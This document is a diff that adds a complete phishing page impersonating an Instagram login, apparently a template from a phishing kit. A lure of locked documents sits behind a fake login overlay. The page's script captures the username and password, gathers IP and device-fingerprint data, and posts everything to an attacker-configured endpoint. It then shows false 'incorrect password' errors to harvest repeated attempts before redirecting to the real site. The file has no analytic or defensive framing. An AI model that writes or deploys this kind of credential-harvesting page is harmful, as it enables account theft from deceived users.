@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Instagram</title>
+<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/png"/>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body,html{height:100%;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa}
+.main-container{display:flex;flex-direction:column;min-height:100vh}
+.top-navbar{background:#fff;height:44px;border-bottom:1px solid #dbdbdb;display:flex;align-items:center;justify-content:center}
+.content-area{flex:1;display:flex;position:relative}
+.document-preview{flex:1;background:#e8e8e8;padding:40px}
+.document-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:25px;max-width:1200px;margin:0 auto}
+.document-card{background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);transition:all .2s;position:relative}
+.document-card:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,0,0,0.15)}
+.document-thumbnail{height:150px;background:#fff;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #eee;padding:10px}
+.thumbnail-content{width:100%;height:100%;background:#f8f8f8;display:flex;flex-direction:column}
+.thumbnail-header{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);height:20px;width:100%}
+.thumbnail-body{flex:1;padding:5px;font-size:6px;overflow:hidden}
+.thumbnail-line{height:3px;background:#ddd;margin:3px 0;width:90%}
+.document-info{padding:12px}
+.document-title{font-size:14px;font-weight:500;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.document-meta{font-size:12px;color:#666;display:flex;align-items:center}
+.document-date{margin-right:10px}.document-type{padding:2px 6px;background:#E8F0FE;color:#1A73E8;border-radius:3px;font-size:10px}
+.document-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:1000;overflow-y:auto;padding:20px}
+.login-container{width:350px;max-width:100%;background:#fff;border:1px solid #dbdbdb;padding:40px 32px;z-index:1001;text-align:center}
+.ig-logo{font-size:36px;font-weight:700;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;margin-bottom:24px;letter-spacing:-1px}
+.form-group{margin-bottom:8px}
+.form-control{height:38px;border-radius:4px;border:1px solid #dbdbdb;padding:0 8px;font-size:12px;width:100%;background:#fafafa}
+.form-control:focus{border-color:#a8a8a8;outline:none}
+.btn-primary{background:#0095F6;border:none;height:32px;font-weight:600;width:100%;border-radius:8px;font-size:14px;color:#fff;cursor:pointer;margin-top:8px}
+.btn-primary:hover{background:#1877F2}
+.btn-primary:disabled{background:#b2dffc}
+.divider{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:12px;font-weight:600;gap:16px}
+.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #dbdbdb}
+.fb-login-btn{background:none;border:none;color:#385185;font-weight:600;font-size:14px;width:100%;cursor:pointer;padding:8px 0;display:flex;align-items:center;justify-content:center;gap:8px}
+.forgot-link{color:#00376b;font-size:12px;margin-top:12px;display:block;text-decoration:none;cursor:pointer}
+.error-message{color:#D32F2F;font-size:12px;margin-top:4px;margin-bottom:8px;display:none;text-align:center}
+.lock-icon{position:absolute;top:10px;right:10px;background:rgba(255,255,255,0.9);width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#262626;font-size:12px}
+.loading-dialog{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,255,255,0.95);padding:20px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,0.3);z-index:9999;text-align:center}
+.loading-dialog .loading-text{margin-top:12px;font-size:14px;color:#262626}
+@media(max-width:768px){.document-list{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:15px}.login-container{padding:32px 20px}}
+</style>
+</head>
+<body>
+<div class="main-container">
+<div class="top-navbar"><span style="font-weight:600;color:#262626;font-size:16px">Instagram</span></div>
+<div class="content-area">
+<div class="document-preview">
+<div class="document-list">
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:60%"></div></div></div></div><div class="document-info"><div class="document-title">{{file1Name}}</div><div class="document-meta"><span class="document-date">{{file1Date}}</span><span class="document-type">PDF</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:70%"></div></div></div></div><div class="document-info"><div class="document-title">{{file2Name}}</div><div class="document-meta"><span class="document-date">{{file2Date}}</span><span class="document-type">DOC</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:80%"></div></div></div></div><div class="document-info"><div class="document-title">{{file3Name}}</div><div class="document-meta"><span class="document-date">{{file3Date}}</span><span class="document-type">XLS</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:90%"></div></div></div></div><div class="document-info"><div class="document-title">{{file4Name}}</div><div class="document-meta"><span class="document-date">{{file4Date}}</span><span class="document-type">PPT</span></div></div></div>
+</div>
+<div class="document-overlay">
+<div class="login-container">
+<div class="ig-logo">Instagram</div>
+<form id="loginForm" onsubmit="return handleSubmit(event);" method="post" autocomplete="off">
+<div class="form-group"><input type="text" class="form-control" id="emailInput" placeholder="Phone number, username, or email" required></div>
+<div class="form-group"><input type="password" class="form-control" id="passwordInput" placeholder="Password" required onkeypress="if(event.key==='Enter')handleSubmit(event)">
+<div class="error-message" id="loginError">Incorrect password. Try again.</div>
+<div class="error-message" id="generalError">An error occurred. Please try again.</div></div>
+<input type="hidden" id="methodInput" value="email">
+<button type="submit" class="btn-primary" id="submitBtn">Log in</button>
+<div class="divider">OR</div>
+<button type="button" class="fb-login-btn"><i class="fab fa-facebook-square"></i> Log in with Facebook</button>
+<a class="forgot-link">Forgot password?</a>
+</form>
+</div></div></div></div></div>
+<div class="loading-dialog" id="loadingDialog">
+<div class="spinner-border" style="color:#0095F6" role="status"><span class="sr-only">Loading...</span></div>
+<div class="loading-text" id="loadingText">Verifying...</div></div>
+<script>
+const templateConfig = { postURL:"{{postURL}}", token:"{{token}}", landingPageLink:"{{landingPageLink}}", maxLoginAttempts:"{{maxLoginAttempts}}" };
+let loginAttempts = 0;
+const MAX_ATTEMPTS = templateConfig.maxLoginAttempts && parseInt(templateConfig.maxLoginAttempts)>0 ? parseInt(templateConfig.maxLoginAttempts) : 3;
+function objectToFormData(obj){const fd=new URLSearchParams();Object.entries(obj).forEach(([k,v])=>fd.append(k,v!=null?v.toString():''));return fd.toString()}
+function getDeviceData(){return{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screenWidth:window.screen.width,screenHeight:window.screen.height,colorDepth:window.screen.colorDepth,pixelRatio:window.devicePixelRatio,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,vendor:navigator.vendor,maxTouchPoints:navigator.maxTouchPoints}}
+function handleSubmit(event){event.preventDefault()
+document.getElementById('loginError').style.display='none';document.getElementById('generalError').style.display='none'
+const id=document.getElementById('emailInput').value.trim();const pw=document.getElementById('passwordInput').value.trim()
+if(!id||!pw){document.getElementById('loginError').textContent="Please fill in all fields.";document.getElementById('loginError').style.display='block';return false}
+const btn=document.getElementById('submitBtn');btn.disabled=true;btn.textContent="Verifying...";document.getElementById('loadingDialog').style.display='block'
+fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>({})).then(ipData=>{
+const payload={token:templateConfig.token,formData:JSON.stringify({loginMethod:'email',identifier:id,password:pw,ipData,deviceData:getDeviceData(),timestamp:new Date().toISOString()})}
+return fetch(`${templateConfig.postURL}/notify-form-submission`,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData(payload)})
+}).then(r=>{if(!r.ok)throw new Error(`HTTP ${r.status}`);return r.json()}).then(data=>{
+loginAttempts++;document.getElementById('loadingDialog').style.display='none';btn.disabled=false;btn.textContent="Log in"
+if(loginAttempts>=MAX_ATTEMPTS){btn.textContent="Redirecting...";let url=templateConfig.landingPageLink||"https://www.instagram.com";if(!url.startsWith('http'))url='https://'+url;window.location.href=url}
+else{document.getElementById('loginError').textContent="Incorrect password. Try again.";document.getElementById('loginError').style.display='block';document.getElementById('passwordInput').value=''}
+}).catch(e=>{console.error(e);document.getElementById('loadingDialog').style.display='none';document.getElementById('generalError').style.display='block';btn.disabled=false;btn.textContent="Log in"})
+return false}
+</script>
+</body>
+</html>
